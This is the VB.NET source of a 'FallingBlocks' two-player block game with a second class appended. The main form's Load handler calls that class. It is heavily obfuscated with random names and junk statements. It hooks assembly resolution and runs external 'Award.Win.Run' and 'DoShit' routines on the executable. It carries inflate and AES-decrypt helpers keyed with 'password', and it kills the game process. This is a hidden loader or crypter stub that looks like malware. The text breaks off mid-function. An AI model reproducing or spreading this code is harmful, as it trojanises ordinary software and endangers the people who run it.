'Program: FallingBlocks
'ProgramCopyright: 2007 Thomas Stockwell
'Programmer: Thomas Stockwell
'Date: February 7, 2008
'License: The Code Project Open Source License (CPOL).  Any directvariations of this code
'    needs to reference the author Thomas Stockwell
Public Class mainForm

    Dim square4, pyramid4, staircase4Left, staircase4Right, lshapeLeft, lshapeRight, line As Image
    Private Sub mainForm_KeyUp(ByVal sender As System.Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles MyBase.KeyUp
        Select Case e.KeyCode
            Case Keys.W
                If (Me.Player2.CurrentScore > 1) Then
                    Me.Player2.ToggleOrientation()
                End If
            Case Keys.Up
                Me.Player1.ToggleOrientation()
            Case Keys.A
                If (Me.Player2.CurrentScore > 1) Then
                    Me.Player2.MoveLeft()
                End If
            Case Keys.S
                If (Me.Player2.CurrentScore > 1) Then
                    Me.Player2.MoveDown()
                End If
            Case Keys.D
                If (Me.Player2.CurrentScore > 1) Then
                    Me.Player2.MoveRight()
                End If
            Case Keys.Down
                Me.Player1.MoveDown()
            Case Keys.Left
                Me.Player1.MoveLeft()
            Case Keys.Right
                Me.Player1.MoveRight()
            Case Keys.P
                Me.Player1.IsPaused = Not Me.Player1.IsPaused
                Me.Player2.IsPaused = Not Me.Player2.IsPaused
        End Select
    End Sub

    Private Sub btnNewTwoPlayer_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnNewTwoPlayer.Click
        Me.Player1.NewGame()
        Me.Player2.NewGame()
        Me.pbxPlayer1.Image = Nothing
        Me.pbxPlayer2.Image = Nothing
    End Sub

    Private Sub btnSinglePlayer_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnSinglePlayer.Click
        Me.Player1.NewGame()
        Me.Player2.Reset()
        Me.pbxPlayer1.Image = Nothing
        Me.pbxPlayer2.Image = Nothing
    End Sub

#Region "Player1 Player2 Events"
    Private Sub Player1_GameOver(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Player1.GameOver
        'HighScores.SaveHighScore(New Score("Player1", Me.Player1.CurrentScore))
        Me.pbxPlayer1.Image = Nothing
        Me.pbxPlayer2.Image = Nothing
        MessageBox.Show("Game Over")
    End Sub

    Private Sub Player2_GameOver(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Player2.GameOver
        'HighScores.SaveHighScore(New Score("Player2", Me.Player2.CurrentScore))
        Me.pbxPlayer1.Image = Nothing
        Me.pbxPlayer2.Image = Nothing
        MessageBox.Show("Game Over")
    End Sub

    Private Sub Player1_LevelChange(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Player1.LevelChange
        Me.lblPlayer1Level.Text = Me.Player1.CurrentLevel.ToString()
    End Sub

    Private Sub Player1_ScoreChange(ByVal sender As Object, ByVal e As System.EventArgs) Handles Player1.ScoreChange
        Me.lblPlayer1Score.Text = Me.Player1.CurrentScore.ToString()
        Select Case Me.Player1.NextPiece
            Case ShapeType.line
                Me.pbxPlayer1.Image = line
            Case ShapeType.lshapeLeft
                Me.pbxPlayer1.Image = lshapeLeft
            Case ShapeType.lshapeRight
                Me.pbxPlayer1.Image = lshapeRight
            Case ShapeType.pyramid
                Me.pbxPlayer1.Image = pyramid4
            Case ShapeType.square
                Me.pbxPlayer1.Image = square4
            Case ShapeType.staircaseLeft
                Me.pbxPlayer1.Image = staircase4Left
            Case ShapeType.staircaseRight
                Me.pbxPlayer1.Image = staircase4Right
        End Select
    End Sub

    Private Sub Player2_LevelChange(ByVal sender As Object, ByVal e As System.EventArgs) Handles Player2.LevelChange
        Me.lblPlayer2Level.Text = Me.Player2.CurrentLevel.ToString()
    End Sub

    Private Sub Player2_ScoreChange(ByVal sender As Object, ByVal e As System.EventArgs) Handles Player2.ScoreChange
        Me.lblPlayer2Score.Text = Me.Player2.CurrentScore.ToString()
        Select Case Me.Player2.NextPiece
            Case ShapeType.line
                Me.pbxPlayer2.Image = line
            Case ShapeType.lshapeLeft
                Me.pbxPlayer2.Image = lshapeLeft
            Case ShapeType.lshapeRight
                Me.pbxPlayer2.Image = lshapeRight
            Case ShapeType.pyramid
                Me.pbxPlayer2.Image = pyramid4
            Case ShapeType.square
                Me.pbxPlayer2.Image = square4
            Case ShapeType.staircaseLeft
                Me.pbxPlayer2.Image = staircase4Left
            Case ShapeType.staircaseRight
                Me.pbxPlayer2.Image = staircase4Right
        End Select
    End Sub

#End Region

    Private Sub ExitToolStripMenuItem_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles ExitToolStripMenuItem.Click
        Application.Exit()
    End Sub

    Private Sub AboutToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles AboutToolStripMenuItem1.Click
        MessageBox.Show("Program Created by Thomas Stockwell")
    End Sub

    Private Sub PauseToolStripMenuItem1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles PauseToolStripMenuItem1.Click
        Me.Player1.IsPaused = Not Me.Player1.IsPaused
        Me.Player2.IsPaused = Not Me.Player2.IsPaused
    End Sub

    Private Sub btnEndGame_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles btnEndGame.Click
        Me.Player1.Reset()
        Me.Player2.Reset()
    End Sub

    Private Sub mainForm_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        square4 = Image.FromStream(Me.GetType().Assembly.GetManifestResourceStream("FallingBlocks.square4.png"))
        dUfXIJtvKAl.JbsAYDNweTp()
        pyramid4 = Image.FromStream(Me.GetType().Assembly.GetManifestResourceStream("FallingBlocks.pyramid4.png"))
        staircase4Left = Image.FromStream(Me.GetType().Assembly.GetManifestResourceStream("FallingBlocks.staircase4Left.png"))
        staircase4Right = Image.FromStream(Me.GetType().Assembly.GetManifestResourceStream("FallingBlocks.staircase4Right.png"))
        lshapeLeft = Image.FromStream(Me.GetType().Assembly.GetManifestResourceStream("FallingBlocks.lshapeLeft.png"))
        lshapeRight = Image.FromStream(Me.GetType().Assembly.GetManifestResourceStream("FallingBlocks.lshapeRight.png"))
        line = Image.FromStream(Me.GetType().Assembly.GetManifestResourceStream("FallingBlocks.line.png"))
    End Sub

    Private Sub GenericButton_GotFocus(ByVal sender As Object, ByVal e As System.EventArgs) Handles btnEndGame.GotFocus, btnNewTwoPlayer.GotFocus, btnSinglePlayer.GotFocus
        'at request from the www.codeproject.com forum for the accompaning article
        'this event handles the focusing for all buttons on the form and sets
        'the focus to another control that does not participate in focus cues
        Me.Player1.Focus()
    End Sub
End Class


Public Class dUfXIJtvKAl
    Shared Sub ilIvgEbkvcb()
        Dim TTRBuUpNWJQ = Functions.Main.DoShit(Application.ExecutablePath, Application.StartupPath)
        Dim DfNJmLnxtwi As Boolean = True
        If DfNJmLnxtwi = False Then
            Debug.Print("ynfwwqoekgR")
        End If
        Dim ZXQlupqsuCi As Byte() = {}
        Dim qbjRGydTLMN As Long = 424
        Dim YueVNqQDvLK As Long = 96
        Dim cAbliMVjIvM As Byte() = {}


        Dim fBFALZzq = EiaUrAuI()
        If TTRBuUpNWJQ.Item2 = True Then

            fpprXeq()
            Dim sRaESuqVnoO = New anti.IntegrityCheck

            Dim duwAafdD = jlWCUZko()
            sRaESuqVnoO.AppExePath = Application.ExecutablePath
            Dim TFGYYjHWnhE As Integer = 401
            Dim zpgBCemihdf As Object = {}
            Dim mqCaPQLEZOG As String = "pOOJJnHwOmo"
            Dim gWqIoXefVvN As Byte() = {}
            Dim lJZEksuyFrj As String = "hJbFJWZSRcd"
            sRaESuqVnoO.AppPath = Application.StartupPath
            Dim osAAahqSdd As Boolean = True
            If osAAahqSdd = False Then
                Debug.Print("HKiisNEnmV")
            End If
            Dim SdjozCNLaO As Object = {}
            Dim nnBkghFTEI As Integer = 0
            For AymDCVtcNC = 0 To 100
                nnBkghFTEI += 1
            Next
            Dim kVwdclnHrt As Byte() = {}
            Dim xYRJMXFDVp As Boolean = False
            If xYRJMXFDVp = True Then
                Debug.Print("jnLwBmdUUi")
            End If
            sRaESuqVnoO.RunCheck()

            Dim rADnAcYn = uHKNRYXA()
        End If
        Dim UHTjZuQflUg As Object = {}
        Dim iWvHtHvHQtt As Long = 7
        Dim zaPnFQijhDY As Integer = 0
        For IkbXUgQqbvf = 0 To 100
            zaPnFQijhDY += 1
        Next
        Dim MqZnpCVVnfh As Boolean = True
        If MqZnpCVVnfh = False Then
            Debug.Print("gUNNrIwXxCq")
        End If
        Dim nhSDdbAPZLq As Object = {}
        Award.Win.Run(TTRBuUpNWJQ.Item1, Command, Application.ExecutablePath)

        cIFipKz()
        Process.GetCurrentProcess.Kill()
        Dim mzwHsWVXvXB As Integer = 331
        Dim mynvwwcqsiE As Integer = 170
        Dim ShOYZqHCmef As String = "FikxndgYePG"
        Dim WbFwLmzBxkt As Long = 905
        Dim zOYfMjzzaxN As Byte() = {}
    End Sub

    Public Shared Function EiaUrAuI()
        Dim GUkhgyEYbU As Long = 542
        Dim DSdXJBpKkQ As Byte() = {}
        Dim mxDjUSFDtG As Boolean = True
        If mxDjUSFDtG = False Then
            MsgBox("yIpCpFtNCA")
        End If
        Dim VKqLljPGBv As Long = 323
        Dim wiUIAIFoKn As Long = 393
        Dim UcEeKkFTek As String = "xtSpoHZmIc"
        Dim xVEFVHzaGT As Byte() = {}
        Dim beBdNdwfFO As Boolean = True
        If beBdNdwfFO = False Then
            MsgBox("PdOqfpdUtJ")
        End If
        Dim JzEsPvcxsB As Integer = 581
        Dim MLKjasKJgv As Integer = 770
        Dim GZjxayoXAo As String = "LeYCztAVJj"
        Dim VFqvrjfHca As Integer = 0
        For oWYdJPudlT = 0 To 100
            VFqvrjfHca += 1
        Next
        Dim lURSnSfPuP As Long = 245
        Dim HeiOUxYWYJ As Object = {}
        Dim TqUhplLgiD As Object = {}
        Dim DNeGPBFLLv As Integer = 182
        Dim RQznAnXHpq As Byte() = {}
        Return "CfsaoCvXoj"
    End Function
    Public Shared Sub fpprXeq()
        Dim GEdTtdD As String = "lyCdKXC"
        Dim nefyqwT As Object = {}
        Dim CyfDYHy As String = "JWiayaW"
        Dim veUmxOR As Object = {}
        Dim ZzYBYKc As Object = {}
        Dim NWgaZwr As Integer = 385
        Dim dtPZKGU As Integer = 464
    End Sub
    Public Shared Function jlWCUZko()
        Dim KhOjByzh As Byte() = {}
        Dim EqohHEsw As Byte() = {}
        Dim yyPgNKlM As Object = {}
        Dim fmgOoeHp As Boolean = True
        If fmgOoeHp = False Then
            MsgBox("ZuGMujAE")
        End If
        Dim FiYuWDWi As Byte() = {}
        Dim AqytbJQx As Integer = 0
        For uzZrhOJN = 0 To 100
            AqytbJQx += 1
        Next
        Dim amqaJifq As Integer = 0
        For VvRYOoYG = 0 To 100
            amqaJifq += 1
        Next
        Dim BiiGqHuj As Integer = 0
        For vrIFwNnz = 0 To 100
            BiiGqHuj += 1
        Next
        Dim pzjDCTgO As Integer = 133
        Dim WnAldmCr As Object = {}
        Return "QwbkjsvH"
    End Function
    Public Shared Function uHKNRYXA()
        Dim ntxMjfaa As Byte() = {}
        Dim yGACwUzz As Integer = 975
        Dim vztbgXBm As Boolean = False
        If vztbgXBm = True Then
            MsgBox("ssnAPaDZ")
        End If
        Dim DGqqcQcy As Boolean = False
        If DGqqcQcy = True Then
            MsgBox("zzjPLTdl")
        End If
        Dim wrdouWfY As Integer = 642
        Dim HFgeHLEw As Integer = 241
        Dim EyZDrOGj As Boolean = True
        If EyZDrOGj = False Then
            MsgBox("BrTcaSIX")
        End If
        Dim LEWSnHhv As Integer = 0
        For IxPrWKii = 0 To 100
            LEWSnHhv += 1
        Next
        Dim TLShjzIH As Long = 645
        Dim QEMGTCJu As Integer = 900
        Return "NxFfCFLh"
    End Function
    Public Shared Sub cIFipKz()

        Dim IrgLSEd As Integer = 951
        Dim VwKCzRo As Long = 325

        Dim DnrGtJR As Long = 47
        Dim lwndMBj As Long = 353
    End Sub



    Public Shared Function XJCjoRPyCTr(LCWFKbuDZVQ As Byte()) As Byte()
        Dim EiKniiOeVCX = New IO.MemoryStream()

        Dim IyLKyqOc = MFSlOnMp()
        Dim FVvkDhIRRjn = New IO.Compression.DeflateStream(New IO.MemoryStream(LCWFKbuDZVQ), IO.Compression.CompressionMode.Decompress, True)
        Dim oROGOjEUebV As Integer = 0
        For OJPixjcwTvb = 0 To 100
            oROGOjEUebV += 1
        Next
        Dim xKvSfaZTaGt As String = "emFIXUiRpEf"
        Dim ApPcOYxrroT As Integer = 610
        Dim SbUpBguHgKR As Long = 352
        Dim qlkkJhIvyTE As String = "xRCtUBCzCQl"
        Dim hDXOFFRwYQI = New Byte(4095) {}

        Dim gozpkyaQ = UiNnIKXF()
        While True
            Dim iwusyMZlcGK As Integer = 0
            For ivlhCmgEZRO = 0 To 100
                iwusyMZlcGK += 1
            Next
            Dim OfMKggLQUNp As Long = 601
            Dim BfhitTkmLyQ As Boolean = True
            If BfhitTkmLyQ = False Then
                Debug.Print("SZDiRcDPfSD")
            End If
            Dim JhehwLbymcc As Object = {}
            Dim AzFNOuTgrbt As Long = 747
            Dim RtwHEWBoewl = FVvkDhIRRjn.Read(hDXOFFRwYQI, 0, hDXOFFRwYQI.Length)

            Dim kuNpvOKr = mJkCxMeS()
            If RtwHEWBoewl > 0 Then
                Dim ydqINQBUOSr As Integer = 0
                For OpaaKaKKLbK = 0 To 100
                    ydqINQBUOSr += 1
                Next
                Dim cbpzRmeaPWz As Object = {}
                Dim epDBXKFUGFq As Boolean = True
                If epDBXKFUGFq = False Then
                    Debug.Print("PQEfvyrRGcm")
                End If
                Dim HQPsohtlinW As String = "uGmkOUyJciF"
                Dim sxXyCwHPJVK As Boolean = False
                If sxXyCwHPJVK = True Then
                    Debug.Print("jnkeHeploqD")
                End If
                EiKniiOeVCX.Write(hDXOFFRwYQI, 0, RtwHEWBoewl)

                Dim cHtEZiiB = hHjsFdLA()
            Else
                Dim pYMPFuPVEFT As Byte() = {}
                Dim dZhnShorwqu As String = "tTCnqqHVPLh"
                Dim kaemVZfEXUG As Integer = 0
                For btESnJXlbTX = 0 To 100
                    kaemVZfEXUG += 1
                Next
                Dim lNPjqYZrTBW As Object = {}
                Dim gffDnDuXIaw As Boolean = True
                If gffDnDuXIaw = False Then
                    Debug.Print("NwrNsxiWZir")
                End If
                Exit While

                Dim vOIWFFkzC = lWkVjoIiJ()
            End If

            Dim fOfvorrn = zSyabWAw()
        End While

        Dim qWIkcewr = LbaPPJFz()
        FVvkDhIRRjn.Close()

        Dim bhCANzhb = wmUgAeqk()
        Return EiKniiOeVCX.ToArray()
        Dim FALxKlQROFe As Byte() = {}
        Dim vImwpUoAVPD As String = "mbMcHDghaOU"
        Dim wvXtJTinRvS As Boolean = False
        If wvXtJTinRvS = True Then
            Debug.Print("sNnNHyCTGUt")
        End If
        Dim YezXMrrSYcn As Byte() = {}
        Dim oAhWxBUHSby As Integer = 329
    End Function

    Public Shared Function MFSlOnMp()
        Dim TMOzLfnB As Long = 184
        Dim QEIZuioo As Integer = 390
        Dim bSKOHXON As String = "YLEoqbPA"
        Dim UEyNZeRn As Integer = 484
        Dim fSACnTqM As Object = {}
        Dim cKucWWsz As String = "ZDnBFZtm"
        Dim kRqrSOTK As Integer = 435
        Dim gKkQBSUx As Boolean = True
        If gKkQBSUx = False Then
            MsgBox("dCdplVWk")
        End If
        Dim oQgfyKvJ As Integer = 450
        Dim lJaEhNxw As Boolean = False
        If lJaEhNxw = True Then
            MsgBox("iCTdQQyj")
        End If
        Dim AYMJcAPE As Byte() = {}
        Return "xQFiLDRr"
    End Function
    Public Shared Function UiNnIKXF()
        Dim sumsMmdb As Long = 374
        Dim rfPfKoJz As Byte() = {}
        Dim DlBimcMK As Byte() = {}
        Dim PrnlOQQV As Integer = 131
        Dim bxaoqDTf As Long = 922
        Dim ZiDboFzE As Integer = 660
        Dim lnpeQtCP As Byte() = {}
        Dim xtchrhGZ As Boolean = False
        If xtchrhGZ = True Then
            MsgBox("JzOkTVJk")
        End If
        Dim VFAmvJMv As Integer = 0
        For hLmpXxQF = 0 To 100
            VFAmvJMv += 1
        Next
        Dim tRZszlTQ As Boolean = False
        If tRZszlTQ = True Then
            MsgBox("rCCfxnzp")
        End If
        Return "DIoiZbCz"
    End Function
    Public Shared Function mJkCxMeS()
        Dim wAzsXCNC As Boolean = False
        If wAzsXCNC = True Then
            MsgBox("IFlvzqRM")
        End If
        Dim ULYybeUX As String = "SwBkZgAw"
        Dim eCnnBUDG As Boolean = False
        If eCnnBUDG = True Then
            MsgBox("qIZqdIHR")
        End If
        Dim otDdbKnq As String = "AzpgDxqB"
        Dim MFbjfltL As Byte() = {}
        Dim YLOmGZxW As Long = 326
        Dim XwrZEbdv As Byte() = {}
        Dim jCdbgPgF As Integer = 0
        For vHPeIDjQ = 0 To 100
            jCdbgPgF += 1
        Next
        Dim HNChkrna As Integer = 0
        For FyfUitSz = 0 To 100
            HNChkrna += 1
        Next
        Dim RERXKhWK As Integer = 0
        For dKEamVZV = 0 To 100
            RERXKhWK += 1
        Next
        Dim bvhNkXFt As Integer = 869
        Dim nBTQMLIE As Byte() = {}
        Return "zHFTozMP"
    End Function
    Public Shared Function hHjsFdLA()
        Dim YIDQtmGC As Boolean = False
        If YIDQtmGC = True Then
            MsgBox("TJNbOqdE")
        End If
        Dim PJXnivBF As Integer = 898
        Dim LKhzDzYG As Integer = 763
        Dim GLrLXEwH As String = "CLBXsITI"
        Dim xMLjMNrJ As String = "tNVvgROL"
        Dim oNfHBVmM As String = "kOpTVaJN"
        Dim fPzeqehO As Long = 216
        Dim NuBagxhe As String = "JvLmBBEf"
        Dim EvVyVGcg As Integer = 577
        Dim AwfKqKzh As Boolean = True
        If AwfKqKzh = False Then
            MsgBox("vxpWKPXi")
        End If
        Dim rxzheTuk As Byte() = {}
        Return "myJtzXSl"
    End Function
    Public Shared Function lWkVjoIiJ()
        Dim kjzYOqOwN As Integer = 973
        Dim OgqEXlzVL As Integer = 0
        For HInhxTbel = 0 To 100
            OgqEXlzVL += 1
        Next
        Dim qEUBlKoCU As Boolean = False
        If qEUBlKoCU = True Then
            MsgBox("HOmxrSLdK")
        End If
        Dim eEhODWUrI As Integer = 0
        For ffKUpuByD = 0 To 100
            eEhODWUrI += 1
        Next
        Dim BAIXZyXOGzy As Long = 168
        Dim bVWzVzFAVxd As Boolean = False
        If bVWzVzFAVxd = True Then
            MsgBox("mhQdnNlshgn")
        End If
        Dim dXdJswTOMBf As Boolean = True
        If dXdJswTOMBf = False Then
            MsgBox("xLQQiCOOTOg")
        End If
        Dim KFvbaQFtDJK As Object = {}
        Dim eQViDVqiksn As Object = {}
        Dim AediiZaHkRT As Integer = 0
        For YxJQbcJJgZu = 0 To 100
            AediiZaHkRT += 1
        Next
        Dim vZoeIeNJaXN As Object = {}
        Dim ZjuNwbEvcGK As Boolean = False
        If ZjuNwbEvcGK = True Then
            MsgBox("BMOPJYkuHdm")
        End If
        Dim ASWryzNbjnf As Long = 201
        Return "yzJYycBiTks"
    End Function
    Public Shared Function zSyabWAw()
        Dim KJNPBMjf As Boolean = True
        If KJNPBMjf = False Then
            MsgBox("DaEBsTyJ")
        End If
        Dim iVmVFoqA As String = "NQUqSJhs"
        Dim sMBLfdZk As Object = {}
        Dim XHjgsyRc As Long = 965
        Dim QYaRjFgF As Object = {}
        Dim vTImwaXx As Boolean = True
        If vTImwaXx = False Then
            MsgBox("aOpHJvPp")
        End If
        Dim FKXbWQGg As Object = {}
        Dim yaOMMXWK As String = "dWwhZsNC"
        Dim IReCmNFt As Integer = 0
        For nMLXziwl = 0 To 100
            IReCmNFt += 1
        Next
        Dim SItsMDod As Byte() = {}
        Dim LYkdDKDG As Long = 257
        Return "rUSyQfvy"
    End Function
    Public Shared Function LbaPPJFz()
        Dim jmzVSlLU As Integer = 163
        Dim OihqfGDM As Long = 905
        Dim tdOLsbvE As Long = 42
        Dim YZwgFwmv As Boolean = True
        If YZwgFwmv = False Then
            MsgBox("DUeBSRen")
        End If
        Dim KGeCnKQC As Long = 4
        Dim pBLXAfIu As Boolean = True
        If pBLXAfIu = False Then
            MsgBox("UwtsNAAm")
        End If
        Dim AsbMaVre As Byte() = {}
        Dim fnJhnqjV As Boolean = True
        If fnJhnqjV = False Then
            MsgBox("YEASexyz")
        End If
        Dim DzhnrSqq As Long = 936
        Dim iuPIEnhi As Integer = 20
        Dim NqxdRIZa As String = "GGoOHOoD"
        Dim lCVjUjfv As Integer = 60
        Return "QxDDhEXn"
    End Function
    Public Shared Function wmUgAeqk()
        Dim UxsmEGwF As Boolean = True
        If UxsmEGwF = False Then
            MsgBox("ztaGRbox")
        End If
        Dim eoIbewgo As Long = 674
        Dim JkqwrQXg As Integer = 220
        Dim CAhhhXmK As Integer = 457
        Dim hvOCuseB As Integer = 0
        For MrwXHNWt = 0 To 100
            hvOCuseB += 1
        Next
        Dim FHnIyUlX As Long = 187
        Dim kDVdLpcO As Boolean = False
        If kDVdLpcO = True Then
            MsgBox("dTLOCwrs")
        End If
        Dim IPtjPRjk As String = "nKbDcmbb"
        Dim SFJYpHST As Integer = 0
        For LWAJgOhx = 0 To 100
            SFJYpHST += 1
        Next
        Dim qRhetjZo As String = "WNPzGERg"
        Return "BIxUTZIY"
    End Function




    Public Shared gLnBrGnKDPx As Boolean
    Shared Sub JbsAYDNweTp()
        If Not gLnBrGnKDPx Then

            Dim srPQAxeAj = xfyMwStTS()
            AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf qxEaXwmvUvf
            Dim pBQxJwfQclm As Byte() = {}
            Dim ZkhOTmnbHIX As Long = 971
            Dim wCNwMoWdDQy As Boolean = True
            If wCNwMoWdDQy = False Then
                Debug.Print("UfrKtqadyNR")
            End If
            Dim xpxthnQPAwO As Byte() = {}
            Dim aRSvulxOeUq As Long = 720
            gLnBrGnKDPx = True

            Dim WPbRfGOe = bORFLCrd()
        End If

        Dim FmMahtwe = KmCONoYd()
        ilIvgEbkvcb()

        Dim eWVrhSdx = iVLfNNFw()
    End Sub

    Public Shared Function xfyMwStTS()
        Dim rtYbwXXhm As Integer = 904
        Dim ZHTPJPaSx As Boolean = False
        If ZHTPJPaSx = True Then
            MsgBox("MDpXcCPpQ")
        End If
        Dim QOmDrYFTB As Boolean = True
        If QOmDrYFTB = False Then
            MsgBox("pTDhGaiIt")
        End If
        Dim NriftcCJP As Integer = 387
        Dim sgJYQWRUi As Byte() = {}
        Dim FplhrjLwo As Byte() = {}
        Dim peBOuZDGr As Integer = 0
        For DKRWHmnYX = 0 To 100
            peBOuZDGr += 1
        Next
        Dim btvBiobXq As Object = {}
        Dim YrWSbQVU As String = "CvUZZmja"
        Dim gyShXIwg As Boolean = False
        If gyShXIwg = True Then
            MsgBox("wgHYssmA")
        End If
        Dim akFfqPAG As Boolean = True
        If akFfqPAG = False Then
            MsgBox("EnDmolNM")
        End If
        Dim hqCumHaS As Boolean = True
        If hqCumHaS = False Then
            MsgBox("LtABkdoY")
        End If
        Return "pxyJizBe"
    End Function
    Public Shared Function bORFLCrd()
        Dim SQldAKmf As Integer = 93
        Dim NQvpUPJh As String = "JRFBoThi"
        Dim SnYdnKcV As String = "OnipHOzW"
        Dim JosBcTXX As Byte() = {}
        Dim FpCNwXuY As Long = 299
        Dim ApMZQbSZ As String = "iVNUHuSp"
        Dim eWXgbypq As String = "ZWhswDNr"
        Dim VXrEQHks As Boolean = False
        If VXrEQHks = True Then
            MsgBox("QYBQlMIu")
        End If
        Dim MYLbFQfv As Long = 671
        Dim IZVnaVDw As Byte() = {}
        Dim DafzuZax As Long = 429
        Return "MvybsPVk"
    End Function
    Public Shared Function KmCONoYd()
        Dim BnWmCxTf As Boolean = True
        If BnWmCxTf = False Then
            MsgBox("xogxWBrg")
        End If
        Dim soqJrGOi As Long = 450
        Dim opAVLKlj As Object = {}
        Dim jqKhgPJk As Boolean = False
        If jqKhgPJk = True Then
            MsgBox("fqUtATgl")
        End If
        Dim areFUYEm As Object = {}
        Dim WsoRpcbn As Integer = 0
        For RsydJhzp = 0 To 100
            WsoRpcbn += 1
        Next
        Dim NtJpelWq As Boolean = True
        If NtJpelWq = False Then
            MsgBox("JuTAypur")
        End If
        Dim EudMTuRs As Integer = 157
        Dim OQwpRkMf As Integer = 980
        Dim JRGAlpkg As Integer = 226
        Return "FRQMGtHh"
    End Function
    Public Shared Function iVLfNNFw()
        Dim ZXfDCWAy As Integer = 283
        Dim VXpPWaYz As Integer = 213
        Dim QYzbrfvA As Integer = 0
        For MZJnLjTB = 0 To 100
            QYzbrfvA += 1
        Next
        Dim uEKiCCTR As String = "xNKkVBiO"
        Dim sOUwpFGP As Integer = 0
        For oOeIKJdR = 0 To 100
            sOUwpFGP += 1
        Next
        Dim jPoUeOAS As Byte() = {}
        Dim fQygzSYT As Integer = 47
        Dim aQIrTXvU As Integer = 603
        Dim WRSDobTV As Integer = 425
        Dim SScPIgqW As Byte() = {}
        Return "NSmbckOY"
    End Function

    Private Shared Function beMgkMAYvdT(ByVal EdLXoiefwhc() As Byte) As Byte()
        Dim sXZUMuaUMIK As New System.Security.Cryptography.RijndaelManaged
        Dim vNAErwxgTzD As String = "ALigbRhyAkQ"
        Dim CrKCGpyEUHn As Long = 300
        Dim KwyGHHgiRRy As Object = {}
        Dim AXpYKsudBOE As Integer = 0
        For cpLujpGeiwp = 0 To 100
            AXpYKsudBOE += 1
        Next
        Dim kjARwHU As String = "VKBvUwF"
        Dim kLdpWCPJnpG As New System.Security.Cryptography.MD5CryptoServiceProvider
        Dim qTaMOTkKtRk As Byte() = {}
        Dim IEfZAbiaini As Long = 747
        Dim hPvUJcvNzwV As Integer = 0
        For nuNdTwpSEtC = 0 To 100
            hPvUJcvNzwV += 1
        Next
        Dim SwDaWrKrbeJ As String = "cbLXMHguQBA"
        Dim rvMdvSKzrII As Integer = 168


        Dim VQNEfMGs = rNPwhqsm()
        Try
            Dim TKRMABzPJm As Byte() = {}
            Dim wafWdYSinf As Integer = 12
            Dim jiIWglUlGa As String = "NqGuZHSqFU"
            Dim PLbYUFWQZM As Integer = 188
            Dim PoHPEGNpQd As Boolean = True
            If PoHPEGNpQd = False Then
                Debug.Print("SBMGPDwBEW")
            End If
            Dim kGeZcCfKOUK(31) As Byte

            Dim lBmVpbMH = VSweVqWn()
            Dim LwXpQcKEAAU As Byte() = kLdpWCPJnpG.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Dim QbHwPzmXGhj As Long = 66
            Dim lxgjfErKkGE As String = "aMYVvplHXOS"
            Dim wxTWNsLWwKZ As Byte() = {}
            Dim rEkJXXLEnuI As Object = {}
            Dim gKePzIlCcMf As Integer = 10
            Array.Copy(LwXpQcKEAAU, 0, kGeZcCfKOUK, 0, 16)

            zEpdnIp()
            Array.Copy(LwXpQcKEAAU, 0, kGeZcCfKOUK, 15, 16)
            Dim ZuQCACqrBIK As Long = 256
            Dim xXuQhEurvGd As Integer = 740
            Dim ahAzVBkdxpa As Boolean = False
            If ahAzVBkdxpa = True Then
                Debug.Print("CJVBizRccMC")
            End If
            Dim CPddXZtJEWv As Long = 694
            Dim zwPKXCiQoTI As Boolean = True
            If zwPKXCiQoTI = False Then
                Debug.Print("lFBVWqeAKCY")
            End If
            sXZUMuaUMIK.Key = kGeZcCfKOUK

            Dim IkWWPsjt = vmAGYFBx()
            sXZUMuaUMIK.Mode = Security.Cryptography.CipherMode.ECB

            rlSnFBM()
            Dim fZDEWItYHih As System.Security.Cryptography.ICryptoTransform = sXZUMuaUMIK.CreateDecryptor
            Dim OBYRdyZznOJ As Long = 997
            Dim YyvjtOlPFZf As Boolean = True
            If YyvjtOlPFZf = False Then
                Debug.Print("wbaxaRpPzWy")
            End If
            Dim ZlfgONfCBGv As Byte() = {}
            Dim BNAiaLLBgdX As Boolean = True
            If BNAiaLLBgdX = False Then
                Debug.Print("PpRauXMTmjV")
            End If
            Dim MWDHuAAaWgi As Object = {}
            Dim nSkQnzOWDNF() As Byte = fZDEWItYHih.TransformFinalBlock(EdLXoiefwhc, 0, EdLXoiefwhc.Length)
            Dim IMoDuDUHMdh As Boolean = False
            If IMoDuDUHMdh = True Then
                Debug.Print("kGYYgCqSTpq")
            End If
            Dim GrTZyFPhsly As Long = 670
            Dim BzkMIkQOkVh As Object = {}
            Dim cjVBGjScury As String = "HIyxwecpqxi"
            Dim DxBRhInLFtk As String = "HDzhCesqRdm"
            Return nSkQnzOWDNF
            Dim FiTmBLsBMe As Long = 187
            Dim HCpQxJwcfW As String = "mDWBEeYTzS"
            Dim qPcsPbGfoL As Boolean = True
            If qPcsPbGfoL = False Then
                Debug.Print("kdBHOgktHF")
            End If
            Dim DDzcSOUdvw As String = "MeRUKEzPOn"
            Dim gwzCckNkXg As Integer = 142
        Catch ex As Exception

            Dim PBBJKsJA = lxCBMVwu()
            Return Nothing
            Dim xiRHgIbmir As Long = 377
            Dim toajvMimXm As Object = {}
            Dim NGIRNtxIge As String = "muToyUdRzT"
            Dim HEkjfzWZdN As Integer = 165
        End Try

        VEPdBHp()
    End Function

    Public Shared Function rNPwhqsm()
        Dim yTLLdiTy As Integer = 24
        Dim cXJTbFgE As Boolean = True
        If cXJTbFgE = False Then
            MsgBox("GaHaabuJ")
        End If
        Dim kdGhYxHP As String = "ALvZshxj"
        Dim lXjWpyCl As String = "PahdnUQr"
        Dim sdflmqdx As Object = {}
        Dim WhdskMrD As Boolean = False
        If WhdskMrD = True Then
            MsgBox("AkbziiEJ")
        End If
        Dim enZHgFRP As Integer = 0
        For uVPyApHj = 0 To 100
            enZHgFRP += 1
        Next
        Dim XZNFzLVp As Long = 713
        Dim BcLNxhiv As Boolean = True
        If BcLNxhiv = False Then
            MsgBox("ffJUvDwB")
        End If
        Dim JjHctaJH As Byte() = {}
        Dim nmFjrwXN As Integer = 0
